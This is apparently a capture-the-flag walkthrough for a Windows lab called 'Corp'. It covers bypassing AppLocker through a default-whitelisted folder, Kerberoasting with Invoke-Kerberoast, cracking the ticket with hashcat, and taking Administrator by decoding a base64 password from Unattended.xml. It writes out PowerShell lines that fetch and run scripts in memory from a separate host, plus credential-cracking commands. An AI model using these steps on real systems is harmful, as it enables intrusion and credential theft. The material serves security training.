# Corp

### Bypassing Applocker

AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which 
programs users can execute based on the programs path, publisher, and hash.

There are many ways to bypass AppLocker.

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the 
following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default. 

Just like Linux bash, Windows Powershell saves all previous commands into a file called ConsoleHost_history. 
This is located at 
`%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

### Kerberoasting

First step is to enumerate Windows. If we run `setspn -T medin -Q */*` we can extract all accounts in 
the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first download the Powershell [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1) and host it on a web server. Load it into memory
with Invoke-Expression:

```
powershell -ep bypass
Invoke-Expression(New-Object Net.WebClient).DownloadString('http://10.10.10.2:80/kerberoast.ps1')
```

Extract the SPN ticket:

`Invoke-Kerberos -OutputFormat hashcat | Format-List`

Next, use hashcat to bruteforce the password

`hashcat -m 13100 -a 0 hash.txt rockyou.txt`

### Privilege Escalation

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best 
way to get Administrator access.

We will load [PowerUp1.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1) into memory for enumerating any weakness to abuse for local privilege escalation.

```
powershell -ep bypass;
iex(New-Object Net.WebClient).DownloadString('http://10.10.10.2:80/PowerUp.ps1')

Invoke-AllChecks
```

The script has identified several ways to get Administrator access. The first being to bypassUAC and the 
second is UnattendedPath. We will be exploiting the UnattendPath way.

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." [Read more about it here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).

It is also where users passwords are stored in base64 encoding. Navigate to 
`C:\Windows\Panther\Unattend\Unattended.xml.` and decode the password then login as the Administrator:

`[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(('YmFzZTY0IGVuY29kZWQgc3RyaW5nIGhlcmUK')))`
